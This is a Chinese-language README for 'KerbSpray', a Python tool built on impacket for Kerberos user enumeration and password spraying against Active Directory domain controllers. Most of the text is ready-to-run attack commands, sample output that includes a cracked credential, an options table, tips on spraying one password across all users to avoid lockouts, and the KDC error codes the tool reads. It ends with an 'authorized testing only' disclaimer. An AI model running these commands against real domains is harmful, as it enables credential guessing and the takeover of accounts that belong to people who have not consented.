# KerbSpray

Kerberos 密码喷洒 + 用户枚举工具，基于 impacket，单文件多线程。用法和 kerbrute 的 passwordspray / userenum 差不多，主要区别是会顺便把失败原因归类，方便看出哪些用户根本不存在、哪些是密码不对。

## 安装

依赖 `impacket` 和 `dnspython`：

```bash
pip install impacket dnspython
```

Kali 一般自带 impacket，不用装。

## 用法

```bash
python3 kerbspray.py -d 域名 -dc 域控IP -u 用户文件 -p 密码文件 [选项]
```

### 枚举用户

先看看哪些账号存在，不碰密码，不会触发锁定：

```bash
python3 kerbspray.py -d xxxx.com -dc 192.168.18.72 -u user.txt --enum-only
```

```text
[*] Target Domain: xxxx.com, DC: 192.168.18.72
[*] Enumeration mode: Checking 4 users...
[*] Starting 10 threads, total 4 tasks...

[*] Scan completed.
[+] Existing users: 2
    guest
    JACK
[-] Non-existing users: 2
    EOF
    Tssrump
```

### 密码喷洒

加 `--reverse` 就是「一个密码 × 所有用户」，把尝试分散到不同账号，防锁定。不加的话是「一个用户 × 所有密码」，容易把账号锁了，一般别这么用。

```bash
python3 kerbspray.py -d xxxx.com -dc 192.168.18.72 -u user.txt -p pass.txt --reverse -t 20
```

```text
[*] Target Domain: xxxx.com, DC: 192.168.18.72
[*] Starting 20 threads, total 4 tasks...
[+] jack:jackma -> SUCCESS

[*] Scan completed.
[+] Valid credentials found:
    jack:jackma

[*] Failure breakdown:
    KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in Kerberos database x 2
    KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked x 1

[!] Users that DO NOT exist (consider removing from user list):
    EOF
    Tssrump
```

## 选项

| 参数 | 说明 |
|------|------|
| `-d, --domain` | 域名，必填 |
| `-u, --users` | 用户名文件，一行一个，必填 |
| `-dc, --dc-ip` | 域控 IP，不填会自动走 DNS 找 |
| `-p, --passwords` | 密码文件，一行一个 |
| `--enum-only` | 只枚举用户是否存在 |
| `--reverse` | 反向喷洒，一个密码跑所有用户 |
| `-t, --threads` | 线程数，默认 10 |
| `-o, --output` | 结果写到文件 |

用户文件和密码文件都是一行一个，空行自动跳过。

## 常见错误码

| code | 含义 |
|------|------|
| 6 | 用户不存在（`KDC_ERR_C_PRINCIPAL_UNKNOWN`） |
| 18 | 账号被禁用（`KDC_ERR_CLIENT_REVOKED`） |
| 23 | 密码已过期（`KDC_ERR_KEY_EXPIRED`） |
| 24 | 密码错误（`KDC_ERR_PREAUTH_FAILED`） |

## 原理

直接调 impacket 的 `getKerberosTGT` 发 AS-REQ，靠 KDC 返回的错误码判断状态：

- 不存在的用户返回 `6`，存在的用户要预认证会返回别的码 —— 这就是枚举的依据；
- 拿正确密码能拿到 TGT，拿错密码会返回 `24` —— 这就是喷洒的依据。

## 注意

只用于授权测试，没授权别乱扫，出了事自己负责。

## License

MIT
